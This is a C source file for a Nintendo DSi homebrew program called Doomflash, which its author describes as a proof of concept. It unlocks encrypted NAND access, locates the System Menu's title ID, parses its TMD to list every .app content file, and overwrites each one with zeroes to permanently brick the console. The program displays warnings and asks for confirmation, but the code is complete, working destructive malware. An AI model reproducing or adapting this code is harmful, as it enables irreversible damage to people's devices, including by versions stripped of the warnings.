/*
 ______   _____   _____  _______ _______        _______ _______ _     _
 |     \ |     | |     | |  |  | |______ |      |_____| |______ |_____|
 |_____/ |_____| |_____| |  |  | |       |_____ |     | ______| |     |

 ----------------------------------
 Revised and written by Tenor-Z
 2024, 2026
 ----------------------------------
 This project is strictly a proof-of-concept to demonstrate that using the
 right methods, the flash NAND of a Nintendo DSi console can be accessed and
 damaged by adding arbitrary data to files needed for the System Menu. Originally
 I wrote this back in 2024, but it did not work and wasn't as dynamic as I wanted
 it to be. Here, the program looks for all .app files related to the System Menu
 and overwrites a chunk of them with garbage data, preventing them from working
 normally or at all. This is designed to work across all regions and versions

 If you received a copy of this program that doesn't include these credits at the top and/or
 the displayed image on the top screen of the console, it can be assumed that it has been 
 stolen without my consent and has been modified in some way to cause actual harm. 
 My GitHub will always have authorized releases of all my projects
 */        
                                                              
#include <nds.h>
#include <fat.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include "crypto.h"
#include "storage.h"

#include "doomflash_splash.h"	// Contains the header for the top screen banner

#define MAX_APP_FILES 16
#define MAX_PATH_LENGTH 128
#define BUFFER_BLOCK_SIZE 512

// Global variables for backend state
bool unlaunchFound = false;
bool unlaunchPatches = false;
u8 region = 0;
u32 globalLauncherTid = 0;

// Dynamic Path Array Variables
char discoveredPaths[MAX_APP_FILES][MAX_PATH_LENGTH];
int totalAppsFound = 0;

// Utility function to get file sizes
unsigned long long get_nand_file_size(const char *path) {
    struct stat st;
    if (stat(path, &st) == 0) {
        return st.st_size;
    }
    return 0;
}

// A simple function to make the program wait for a certain period of time, similar to the 'sleep()' function
void sleep_seconds(int seconds) {
    // 60 frames = 1 second on the Nintendo DS
    int total_frames = seconds * 60; 
    
    for (int i = 0; i < total_frames; i++) {
        swiWaitForVBlank(); // Pauses the CPU safely until the next frame
    }
}

/**
 * Safely allocates an empty block buffer and writes it into a non-critical path
 * @param formattedNandPath Target path including prefix (e.g., "nand:/sys/sector_test.bin")
 * @param sectorCount Number of 512-byte blocks to fill (8 sectors = 4 KB)
 */

bool write_zero_pattern_to_workspace(const char *formattedNandPath, int sectorCount) {

    // Open file directly since the path already includes the "nand:/" prefix
    FILE *fileHandle = fopen(formattedNandPath, "wb");
    if (!fileHandle) {
		printf("\n\n\n");
        printf("Error: Failed to open file path for writing.\n");
		printf("Please hold the POWER button to exit.\n");
        return false;
    }

    // Allocate a clean 512-byte block buffer filled completely with zeroes
    unsigned char zeroBuffer[BUFFER_BLOCK_SIZE];
    memset(zeroBuffer, 0x00, sizeof(zeroBuffer));

    size_t totalElementsWritten = 0;
    
    // And write out the pattern sequentially sector-by-sector
    for (int i = 0; i < sectorCount; i++) {
        size_t written = fwrite(zeroBuffer, 1, BUFFER_BLOCK_SIZE, fileHandle);
        totalElementsWritten += written;
    }

    // Force flash cache synchronization and clear system file descriptors
    fflush(fileHandle);
    fclose(fileHandle);

    size_t expectedTotalSize = sectorCount * BUFFER_BLOCK_SIZE;
    return (totalElementsWritten == expectedTotalSize);
}

/*Initializes low-level cryptographic NAND access keys
 By default, the NAND is encrypted, and most emulators including MelonDS
 prevent you from accessing and writing changes to it. Other emulators are
 too old to even support it. Because of these limitations, the only way the
 program can run successfully is on an actual physical DSi console, as this
 function initializes the cryptographic access keys needed to access the 
 filesystem and dynamically obtains the title ID of the System Menu.
*/
bool initialize_everything(void) {
    if (!isDSiMode()) return false;
    if (!fatInitDefault()) return false;
    if (!nandInit(true)) return false; // Hardware write mode active

    {
        fifoWaitValue32(FIFO_USER_01);
        u32 consoleId[2]; 
        consoleId[0] = fifoGetValue32(FIFO_USER_01);
        consoleId[1] = fifoGetValue32(FIFO_USER_01);
        dsi_crypt_init(consoleId); 
    }

    // Obtain the region of the system by checking HWINFO_S.dat, which is used by the stage 2 bootloader
    // Viewing the value at exactly 0xA0 tells us the title ID of the System Menu installed

    FILE *file = fopen("nand:/sys/HWINFO_S.dat", "rb");
    if (file) {
        fseek(file, 0xA0, SEEK_SET);
        fread(&globalLauncherTid, sizeof(u32), 1, file);
        fclose(file);

        region = globalLauncherTid & 0xFF;

        char path[MAX_PATH_LENGTH];
        snprintf(path, sizeof(path), "nand:/title/00030017/%08lx/content/title.tmd", (unsigned long)globalLauncherTid); // Construct the discovered TID into an absolute path

        // For traditional installations of Unlaunch, any title ID metadata file that is above 520 bytes indicates
        // homebrew modification

        unsigned long long tmdSize = get_nand_file_size(path);
        if (tmdSize > 520) {
            unlaunchFound = true;

            const static u32 tidValues[][2] = {
                {0xE439, 0x382E3176},
                {0xB07C, 0x17484E41},
                {0xB099, 0x17484E41},
                {0xB079, 0x484E1841},
            };

            // For Safe Unlaunch installations, the TMD is usually regular sized so the program checks the file for the installation of Safe Unlaunch
            // If offset 0x190 has the G value (0x47), it can be assumed Safe Unlaunch has been installed on the system

            FILE *tmd = fopen(path, "rb");
            if (tmd) {
                for (size_t i = 0; i < sizeof(tidValues) / sizeof(tidValues[0]); i++) {
                    if (fseek(tmd, tidValues[i][0], SEEK_SET) == 0) {
                        u32 tidVal;
                        fread(&tidVal, sizeof(u32), 1, tmd);
                        if (tidVal == tidValues[i][1]) {
                            unlaunchPatches = true;
                            break;
                        }
                    }
                }
                fclose(tmd);
            }
        } else { 
            FILE *tmd = fopen(path, "rb");
            if (tmd) {
                fseek(tmd, 0x190, SEEK_SET);
                unsigned char val;
                fread(&val, 1, 1, tmd);
                fclose(tmd);

                if (val == 0x47) {
                    unlaunchFound = true;
                    unlaunchPatches = true;
                }
            }
        }
    }
    return true;
}

// Parses the system TMD index file and logs standard nand:/ prefixes
// Benefits other functions in the program since the path is absolute
void discover_and_store_app_paths(void) {
    char tmdPath[MAX_PATH_LENGTH];
    snprintf(tmdPath, sizeof(tmdPath), "nand:/title/00030017/%08lx/content/title.tmd", (unsigned long)globalLauncherTid);   // Use the previously obtained system menu TID for path building

    // Open it to verify it is there and can be opened successfully

    FILE *tmdFile = fopen(tmdPath, "rb");
    if (!tmdFile) {
        printf("\n\n\n");
        printf("\x1B[31mError:\x1B[37m Unable to open System TMD.\n");
        printf("Please hold the POWER button to exit.\n");
        return;
    }

    // Here is where we determine how many files (.app) make up the System Menu
    // by looping through the tmd file for it
    u16 numContents = 0;
    fseek(tmdFile, 0x1DE, SEEK_SET);
    fread(&numContents, sizeof(u16), 1, tmdFile);
    numContents = __builtin_bswap16(numContents);

    totalAppsFound = 0;

    // For every component it finds, extract the contentId and pair it with the global globalLauncherTid to log 
    // the absolute path of every single boot file into the discoveredPaths array

    for (int i = 0; i < numContents; i++) {
        if (totalAppsFound >= MAX_APP_FILES) break; // Rate limiting only

        u32 currentRecordOffset = 0x2B4 + (i * 48);
        fseek(tmdFile, currentRecordOffset, SEEK_SET);

        u32 contentId = 0;
        fread(&contentId, sizeof(u32), 1, tmdFile);
        contentId = __builtin_bswap32(contentId);

        // Standardized with a clean "nand:/" layout across every element
        snprintf(discoveredPaths[totalAppsFound], MAX_PATH_LENGTH, 
                 "nand:/title/00030017/%08lx/content/%08lx.app", 
                 (unsigned long)globalLauncherTid, (unsigned long)contentId);
        
        printf("Saved [%d]: %08lx.app\n", totalAppsFound, (unsigned long)contentId);
        
        totalAppsFound++;
    }
    
    fclose(tmdFile);
}

// Receives the scanned path, validates access, and executes the overwrite
// This is applicable to all .app files the program finds that make up the
// System Menu.
void process_forwarded_nand_stream(const char *targetMountPath) {
    printf("Forwarded to stream handler:\n -> %s\n", targetMountPath);

    // Check if the scanned system app path can be read successfully
    FILE *stream = fopen(targetMountPath, "rb");
    if (stream) {
        fclose(stream); // Free file handle immediately

        int sectorsToFill = 8; // 8 sectors * 512 bytes = 4 KB test file size

        if (write_zero_pattern_to_workspace(targetMountPath, sectorsToFill)) {
            printf("    \x1B[32m[SUCCESS] Wrote zeroes to %s\x1B[37m\n", targetMountPath);
        } else {
            printf("    \x1B[31m[FAILED] Write was rejected\x1B[37m\n");
        }
    } else {
        printf("\x1B[31m[STATUS] Access Blocked / Skipping Write\x1B[37m\n");
    }
}

// This reads the contents of each .app file and forwards them to the processing function if all is well
void inspect_app_binary_headers(void) {
    printf("\n--- Reading App File Contents ---\n");
    
    for (int i = 0; i < totalAppsFound; i++) {
        FILE *appFile = fopen(discoveredPaths[i], "rb");
        if (!appFile) {
            printf("\n\n\n");
            printf("[%d] Unable to open: %s\n", i, discoveredPaths[i]);
            printf("Please hold the POWER button to exit.\n");
            continue;
        }

        fclose(appFile); 

        // Forward path string directly to the target processing function
        process_forwarded_nand_stream(discoveredPaths[i]);
        printf("--------------------------------\n");
    }
}

// Basic reconnisance function that gets the stored variables of apps that make up the System Menu
void demonstrate_reading_stored_paths(void) {
    printf("\n--- Reading Stored Variables ---\n");
    for (int i = 0; i < totalAppsFound; i++) {
        unsigned long long fileSize = get_nand_file_size(discoveredPaths[i]);
        printf("App %d Size: %llu bytes\n", i, fileSize);
    }
}

int main(int argc, char **argv) {
    defaultExceptionHandler();

    lcdMainOnTop();
    powerOn(POWER_ALL_2D);
    
    vramSetBankA(VRAM_A_MAIN_BG);
    videoSetMode(MODE_0_2D);

    // Explicitly configure separate map and tile indexing parameters
    int bg = bgInitHidden(0, BgType_Text8bpp, BgSize_T_512x256, 0, 1);

    // Clear out all prefixes and use the raw base array names
    // This ensures the unmodified, untouched banner image is properly displayed
    memcpy(bgGetGfxPtr(bg), doomflash_splashTiles, doomflash_splashTilesLen);
    memcpy(bgGetMapPtr(bg), doomflash_splashMap, doomflash_splashMapLen);
    memcpy(BG_PALETTE, doomflash_splashPal, doomflash_splashPalLen);

    bgShow(bg);

    videoSetModeSub(MODE_0_2D);
    vramSetBankC(VRAM_C_SUB_BG);
    consoleDemoInit();


    // RENDER INTERACTIVE WARNING CARD (pushed onto the physical bottom screen)
	printf("\n\n");
	printf("===============================\n\n");
    printf("\x1B[41;1m  !!! WARNING !!!  \x1B[47;0m\n\n");
    printf("This program is purposefully\n");
    printf("malicious and will cause\n");
	printf("PERMANENT damage to your\n");
	printf("Nintendo DSi.\n\n\n");
	printf("Any damage, whether\n");
    printf("intentional or not is your\n");
	printf("responsibility past this screen\n\n\n");
	printf("Are you sure you want to\n");
    printf("run this application?\n\n");
    printf("Press \x1B[32m[A] to Proceed\x1B[37m\n");
    printf("Press \x1B[31m[B] to Abort\x1B[37m\n\n");
	printf("===============================\n");

    // Hold loop for warning validation check
    while (1) {
        swiWaitForVBlank();
        scanKeys();
        u32 initialKeys = keysDown();

        if (initialKeys & KEY_A) {
            printf("\x1B[2J\x1B[H"); // Wipe bottom screen layout text cleanly
            break; 
        }

        if (initialKeys & KEY_B) {
            printf("\x1B[2J\x1B[H");
			printf("\n\n");
            printf("\x1B[31mExecution aborted by user.\x1B[37m\n\n");
			printf("Please hold the POWER button to exit.");
            while (1) swiWaitForVBlank();
        }
    }

    // Main operational console displays directly below the warning line
    printf("Connecting to secure storage...");
    bool initSuccess = initialize_everything();
    printf("\r                               \r"); 

    if (initSuccess) {
        printf("\x1B[32mSystem Environment Ready!\x1B[37m\n\n");
    } else {
		printf("\n\n");
        printf("\x1B[31m[CRITICAL ERROR] Init failed.\x1B[37m\n\n");
		printf("Please hold the POWER button to exit.");
        while(1) swiWaitForVBlank();
    }

    bool infoDisplayed = false;
	printf("\n\n");
	printf("===============================\n\n");
	printf("\x1B[31m[DOOMFLASH]\x1B[37m\n");
	printf("      Created by Tenor-Z         \n");
	printf("===============================\n\n");
	printf("Press \x1B[33m[A]\x1B[37m to brick this console.\n");
	printf("Press \x1B[33m[B]\x1B[37m to exit.\n");
    while (1) {
        swiWaitForVBlank();
        scanKeys();
        u32 keys = keysDown();

        if ((keys & KEY_A) && !infoDisplayed) {
            infoDisplayed = true;
            printf("\x1B[4;0H\x1B[J"); // Clears text space down while leaving top image untouched

            printf("Console Region:  0x%02X\n", region);
            printf("Launcher TID:    00030017%08lX\n", (unsigned long)globalLauncherTid);
            
            discover_and_store_app_paths();
            demonstrate_reading_stored_paths();
            inspect_app_binary_headers();
        }
    }

    return 0;
}
